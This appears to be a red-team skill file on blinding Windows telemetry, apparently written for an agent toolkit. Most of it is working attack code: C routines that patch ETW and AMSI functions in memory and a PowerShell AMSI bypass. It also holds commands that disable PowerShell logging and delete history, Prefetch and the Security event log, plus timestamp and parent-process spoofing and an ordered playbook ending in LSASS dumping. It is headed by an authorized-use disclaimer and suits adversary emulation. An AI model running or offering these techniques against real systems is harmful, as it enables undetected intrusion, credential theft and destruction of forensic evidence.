# Telemetry Blinding: ETW / AMSI / Anti-Forensics

> For authorized red team / adversary emulation / testing your own products only; prohibited for unauthorized targets.

EDR detection capability depends heavily on two telemetry pipelines: ETW (Event Tracing for Windows) and AMSI (Antimalware Scan Interface).
This document summarizes red-team countermeasures against these two pipelines and adds Sysmon / PowerShell logging / timestamp spoof and other anti-forensic combinations.

Mapped to MITRE ATT&CK: T1562.001 / T1562.002 / T1562.006 / T1070 / T1027.

## 1. ETW internal structure

ETW is Windows' built-in high-performance event tracing framework; EDR uses it for "lightweight kernel telemetry".
The providers the red team cares about most:

| Provider GUID | Name | Who uses it |
|--------------|------|--------|
| `{F4E1897C-BB5D-5668-F1D8-040F4D8DD344}` | Microsoft-Windows-Threat-Intelligence (ETW-TI) | Defender, MDE, third-party EDR |
| `{A0C1853B-5C40-4B15-8766-3CF1C58F985A}` | Microsoft-Antimalware-Scan-Interface | Defender AMSI reporting |
| `{22FB2CD6-0E7B-422B-A0C7-2FAD1FD0E716}` | Microsoft-Windows-Kernel-Process | basic process / thread events |
| `{2839FF94-8F12-4E1B-82E3-AF7AF77A450F}` | Microsoft-Windows-DotNETRuntime | .NET loading, JIT |
| `{E13C0D23-CCBC-4E12-931B-D9CC2EEE27E4}` | .NET CLR | CLR startup |

### Key user-mode APIs

| API | DLL | Role |
|-----|-----|------|
| `EtwEventWrite` | `ntdll.dll` | write events (most commonly used) |
| `EtwEventWriteFull` | `ntdll.dll` | events with activity ID |
| `EtwEventWriteEx` | `ntdll.dll` | extended version |
| `NtTraceEvent` | `ntdll.dll` | underlying EtwEventWrite |
| `NtTraceControl` | `ntdll.dll` | control trace session (start/stop/query provider) |
| `EtwEventEnabled` | `ntdll.dll` | whether the provider is enabled |
| `EtwEventRegister` | `ntdll.dll` | register provider |

### Call chain

```text
Application code EventWrite(...)
  → Microsoft wrapper (TraceLogging API)
  → ntdll!EtwEventWrite[Full|Ex]
  → ntdll!NtTraceEvent (syscall)
  → nt!NtTraceEvent (kernel)
  → kernel ETW core → consumer (EDR user-mode process subscribes to session)
```

## 2. Three ETW patch methods

### Method A: EtwEventWrite head patch

Directly change the `ntdll!EtwEventWrite` entry to immediately return success:

```text
Original:
  4C 8B DC                 mov r11, rsp
  48 81 EC 88 00 00 00     sub rsp, 88h
  ...

After patch (x64):
  33 C0                    xor eax, eax       ; STATUS_SUCCESS = 0
  C3                       ret
```

C code:

```c
#include <windows.h>

BOOL PatchEtwEventWrite(void) {
    HMODULE hNtdll = GetModuleHandleA("ntdll.dll");
    if (!hNtdll) return FALSE;

    FARPROC pEtw = GetProcAddress(hNtdll, "EtwEventWrite");
    if (!pEtw) return FALSE;

    BYTE patch[] = { 0x33, 0xC0, 0xC3 };   // xor eax,eax; ret
    DWORD oldProt = 0;

    // Note: VirtualProtect itself may be hooked -> use the indirect syscall version
    if (!VirtualProtect(pEtw, sizeof(patch), PAGE_EXECUTE_READWRITE, &oldProt))
        return FALSE;

    memcpy(pEtw, patch, sizeof(patch));

    VirtualProtect(pEtw, sizeof(patch), oldProt, &oldProt);
    return TRUE;
}
```

**OPSEC warning**: writing to ntdll memory is itself an event source monitored by ETW-TI: `ALPC_MODIFY_PROCESS` / `PROTECTVM`.
You must **first use indirect syscall + bypass the NtProtectVirtualMemory hook, then patch**;
otherwise the EDR receives the alert before the patch even takes effect.

### Method B: EtwEventEnabled always-false

Stealthier: don't modify `EtwEventWrite`; instead make `EtwEventEnabled` always return FALSE.
The application layer then decides "the provider is off" → it won't call `EtwEventWrite`, which is friendlier to memory-hash integrity checks (many EDRs verify the bytes of `EtwEventWrite`).

```c
// EtwEventEnabled normally returns BOOLEAN (1 byte)
BYTE patch[] = { 0x32, 0xC0, 0xC3 };   // xor al,al; ret
```

### Method C: NtTraceControl to disable the provider

Use a syscall to directly close the EDR session (intrusive, but does not touch ntdll bytes):

```c
// NtTraceControl(EtwpStopTrace, ...)
// requires SeSystemProfilePrivilege or higher
// applicable after Local Admin + UAC bypass
```

Rarely used in practice, because:

- Closing a session itself triggers an "ETW provider stopped" event that another pipeline can perceive
- It requires high privileges

### Method D: kernel-mode ETW patch (only when you already have BYOVD/kernel read-write)

```text
nt!EtwpEventTracingProviderEnableInfo
nt!EtwThreatIntProvRegHandle
set to 0 directly so all ETW-TI events are discarded
```

Belongs to the BYOVD stage of attack-chain; this skill does not go deep into it.

## 3. AMSI Bypass

AMSI is the interface Windows provides to PowerShell / .NET / WMI / VBA for antivirus scanning before executing scripts.
The red team most often encounters PowerShell + AMSI.

### Classic AmsiScanBuffer patch

```c
// write at amsi.dll!AmsiScanBuffer entry:
//   mov eax, 0x80070057     ; E_INVALIDARG
//   ret 4                    ; (32-bit) or ret (64-bit)

BOOL PatchAmsi(void) {
    HMODULE h = LoadLibraryA("amsi.dll");
    if (!h) return FALSE;
    FARPROC p = GetProcAddress(h, "AmsiScanBuffer");
    if (!p) return FALSE;

    BYTE patch64[] = {
        0xB8, 0x57, 0x00, 0x07, 0x80,   // mov eax, 0x80070057
        0xC3                              // ret
    };
    DWORD old = 0;
    VirtualProtect(p, sizeof(patch64), PAGE_EXECUTE_READWRITE, &old);
    memcpy(p, patch64, sizeof(patch64));
    VirtualProtect(p, sizeof(patch64), old, &old);
    return TRUE;
}
```

PowerShell one-liner version (for reference in detection evasion only; it is itself signatured / blocked by Defender):

```powershell
# Concept demo — in a real environment you must combine with obfuscation / HWBP
[Ref].Assembly.GetType('System.Management.Automation.'+$([char]65+'msi'+'Utils')).GetField($([char]97+'msiInitFailed'),'NonPublic,Static').SetValue($null,$true)
```

### Advanced option 1: Hardware Breakpoint AMSI Bypass

Does not touch amsi.dll memory (won't trigger integrity scanning):

1. AddVectoredExceptionHandler
2. Set `DR0` at the `AmsiScanBuffer` entry
3. When the VEH hits, set `RAX = 0x80070057`, `RIP = ret instruction address`, `RSP += 8`
4. ContinueExecution

Same infrastructure as the HWBP Blindside in unhook-techniques.md; the VEH can be shared.

### Advanced option 2: AmsiContext / AmsiSession corruption

Craft a malformed `AmsiContext` structure so `AmsiScanBuffer` returns success early due to an internal validation failure:

```text
// The AmsiContext header should be the "AMSI" magic
// change it to "XXXX" → AmsiScanBuffer's internal validation fails but it returns S_OK + AMSI_RESULT_CLEAN
```

### Advanced option 3: Reflective load of a copy of amsi.dll

Instead of the system amsi.dll, reflectively load a clean copy into your own process and redirect the PowerShell engine's AMSI calls.
Suitable for advanced EDRs that already block PowerShell.exe startup at the loading stage.

## 4. Anti-forensics: clearing traces

### Disable PowerShell ScriptBlock Logging

```powershell
# Registry (requires administrator)
Set-ItemProperty -Path 'HKLM:\SOFTWARE\Policies\Microsoft\Windows\PowerShell\ScriptBlockLogging' `
    -Name 'EnableScriptBlockLogging' -Value 0 -Force

Set-ItemProperty -Path 'HKLM:\SOFTWARE\Policies\Microsoft\Windows\PowerShell\ModuleLogging' `
    -Name 'EnableModuleLogging' -Value 0 -Force

Set-ItemProperty -Path 'HKLM:\SOFTWARE\Policies\Microsoft\Windows\PowerShell\Transcription' `
    -Name 'EnableTranscripting' -Value 0 -Force

# Group Policy path:
# Computer Configuration → Administrative Templates → Windows Components →
#   Windows PowerShell → Turn on PowerShell Script Block Logging = Disabled
```

### Clear PowerShell history

```powershell
# Current session
Clear-History
# Persistent history (PSReadLine)
Remove-Item (Get-PSReadLineOption).HistorySavePath -Force -ErrorAction SilentlyContinue
```

### Clear Prefetch

```powershell
# Requires SYSTEM
Remove-Item 'C:\Windows\Prefetch\implant*.pf' -Force
# Wipe everything (loud action, use with caution)
# Remove-Item 'C:\Windows\Prefetch\*.pf' -Force
```

### Clear ETL log

```powershell
# Stop the session, then delete the etl
logman stop "EventLog-Security" -ets
Remove-Item 'C:\Windows\System32\winevt\Logs\Security.evtx' -Force -ErrorAction SilentlyContinue
# Note: deleting .evtx directly makes the Event Log Service recreate it and write a "log cleared" event (Event ID 1102)
# Stealthier: patch the EventLog API in wevtsvc.dll in memory (T1070.001)
```

### Timestamp spoof (T1070.006)

```powershell
$f = 'C:\Windows\Temp\implant.dll'
$ref = 'C:\Windows\System32\notepad.exe'
(Get-Item $f).CreationTime   = (Get-Item $ref).CreationTime
(Get-Item $f).LastWriteTime  = (Get-Item $ref).LastWriteTime
(Get-Item $f).LastAccessTime = (Get-Item $ref).LastAccessTime
```

## 5. Sysmon monitoring evasion

Sysmon is the most common free telemetry in the community (many enterprises use the olaf config).
Key events:

| Event ID | Meaning |
|----------|------|
| 1 | ProcessCreate (includes PPID, CommandLine, Hash) |
| 7 | ImageLoad (DLL loading) |
| 8 | CreateRemoteThread |
| 10 | ProcessAccess (OpenProcess) |
| 11 | FileCreate |
| 12/13/14 | Registry |
| 22 | DNS Query |
| 25 | ProcessTampering (image hollowing) |

### Evasion approaches

1. **Don't create new processes** — operate entirely inside the already-injected process, avoiding Event ID 1
2. **PPID Spoof** — use `UpdateProcThreadAttribute(PROC_THREAD_ATTRIBUTE_PARENT_PROCESS)` to set the PPID to `explorer.exe`, so Sysmon ProcessCreate looks legitimate

```c
STARTUPINFOEX si = {0};
PROCESS_INFORMATION pi = {0};
SIZE_T size = 0;
HANDLE hParent = OpenProcess(PROCESS_CREATE_PROCESS, FALSE, g_explorerPid);

si.StartupInfo.cb = sizeof(STARTUPINFOEX);
InitializeProcThreadAttributeList(NULL, 1, 0, &size);
si.lpAttributeList = (LPPROC_THREAD_ATTRIBUTE_LIST)HeapAlloc(GetProcessHeap(), 0, size);
InitializeProcThreadAttributeList(si.lpAttributeList, 1, 0, &size);
UpdateProcThreadAttribute(si.lpAttributeList, 0,
    PROC_THREAD_ATTRIBUTE_PARENT_PROCESS, &hParent, sizeof(HANDLE), NULL, NULL);

CreateProcessW(L"C:\\Windows\\System32\\notepad.exe", NULL, NULL, NULL, FALSE,
    EXTENDED_STARTUPINFO_PRESENT, NULL, NULL, &si.StartupInfo, &pi);
```

3. **Unbacked memory + don't touch the image** — Process Hollowing is already caught by Event ID 25 in newer Sysmon.
   Prefer newer techniques like **module stomping** (overwriting a section of an already-loaded legitimate DLL) or **dirty vanity**,
   combined with PPID spoof
4. **No remote threads** — avoid Event ID 8; use `NtCreateThreadEx` to execute within your own process / APC / Early Bird APC
5. **DNS over DoH / HTTPS** — avoid Event ID 22

## 6. Call Stack Spoof + timestamps to make events look like legitimate software

Even if ProcessCreate cannot be avoided (e.g., some scenarios require spawning a child), you can:

- Make the CommandLine resemble that of some legitimate software
- PPID spoof to services.exe (impersonating a service started by SCM)
- Modify the image hash seen by ImageLoad: use module stomping to put the implant code into a signed DLL's memory space
- Combine with CallStackSpoofer: Sysmon can't see the implant frames even with EnableCallTracing on

## 7. Real-world OPSEC: order of operations

**Get the order wrong and the EDR receives the alert first**, causing subsequent actions to be cut off immediately.

Correct order:

```text
1. AMSI bypass (prefer HWBP, avoid writing amsi.dll)
   ─── so .NET / PowerShell isn't scanned when loading the implant
2. ETW patch (patch EtwEventWrite first, before any syscall)
   ─── turn off telemetry for your own subsequent actions
3. Call NtProtectVirtualMemory via indirect syscall
   ─── set up a "safe" channel for switching memory permissions
4. Unhook ntdll (Peruns Fart) or enable indirect syscall
   ─── erase user-mode hooks
5. Call stack spoof setup
   ─── prepare the fake stack for all subsequent syscalls
6. Actual payload execution (injection / lateral movement / dump LSASS)
7. Clear traces (PowerShell history / Prefetch / timestamps)
```

Examples of wrong order:

```text
❌ unhook ntdll first → ETW-TI immediately reports PROTECTVM + module modification → SOC already alerted
❌ dump LSASS first → AMSI / ETW not yet suppressed → high-confidence T1003.001 alert
✅ AMSI → ETW → unhook → spoof → payload
```

## References

- ETW Threat Intelligence Provider: <https://learn.microsoft.com/en-us/windows/win32/etw/event-tracing-portal>
- ETW Patching overview: <https://www.mdsec.co.uk/2020/03/hiding-your-net-etw/>
- AMSI Bypass collection: <https://github.com/S3cur3Th1sSh1t/Amsi-Bypass-Powershell>
- Sysmon olaf config: <https://github.com/olafhartong/sysmon-modular>
- PPID Spoofing: <https://blog.didierstevens.com/2017/03/20/>
- Ekko sleep mask: <https://github.com/Cracked5pider/Ekko>
- Foliage sleep obfuscation: <https://github.com/SecIdiot/FOLIAGE>
- MITRE T1562.002 (Disable Windows Event Logging): <https://attack.mitre.org/techniques/T1562/002/>
- MITRE T1562.006 (Indicator Blocking): <https://attack.mitre.org/techniques/T1562/006/>
- MITRE T1070 (Indicator Removal): <https://attack.mitre.org/techniques/T1070/>

## Routing callback

After completing this triad (hook survey → unhook → telemetry blinding), return to Step 5 in `SKILL.md` to validate in a sandbox,
then proceed to the next stage per the initial access and lateral movement sections of `attack-chain/`.
